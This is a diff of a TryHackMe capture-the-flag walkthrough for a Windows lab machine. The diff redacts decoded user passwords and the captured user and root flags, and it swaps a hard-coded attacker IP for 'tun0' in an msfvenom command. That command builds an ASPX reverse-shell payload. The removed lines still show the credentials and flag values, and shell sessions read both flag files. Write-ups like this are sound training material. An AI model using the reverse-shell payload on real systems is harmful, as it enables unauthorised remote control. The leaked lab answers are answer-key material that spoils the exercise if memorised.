@@ -92,11 +92,11 @@ IP : 10.10.253.131
 
 👉️Decoding Passwords.txt to base 64 :
 
-	echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d 
-	😎️ Bob - !P@$$W0rD!123#  				(FAKE USER)
+	echo #HASHES# | base64 -d 
+	😎️ Bob - #Password#  				(FAKE USER)
 	
-	echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d  
-	😎️Bill - Juw4nnaM4n420696969!$$$# 
+	echo #HASHES# | base64 -d  
+	😎️Bill - #Password#
 	
 	
 👉️Dirsearch :
@@ -147,7 +147,7 @@ IP : 10.10.253.131
 
 
 👉️Getting reverse shell :
-	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.9.236 LPORT=5555 -f aspx -o pwn.aspx
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=5555 -f aspx -o pwn.aspx
 	[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 	[-] No arch selected, selecting arch: x64 from the payload
 	No encoder specified, outputting raw payload
@@ -354,7 +354,9 @@ IP : 10.10.253.131
 
 	c:\Users\Bob\Desktop>type user.txt
 	type user.txt
-	THM{fdk4ka34vk346ksxfr21tg789ktf45}
+	THM{**********************************}
+	
+	
 	c:\Users\Bob\Desktop>cd ..
 	cd ..
 
@@ -436,7 +438,7 @@ IP : 10.10.253.131
 
 	C:\Users\Administrator\Desktop>type root.txt
 	type root.txt
-	THM{1fk5kf469devly1gl320zafgl345pv}
+	THM{****************************}
 
 
 
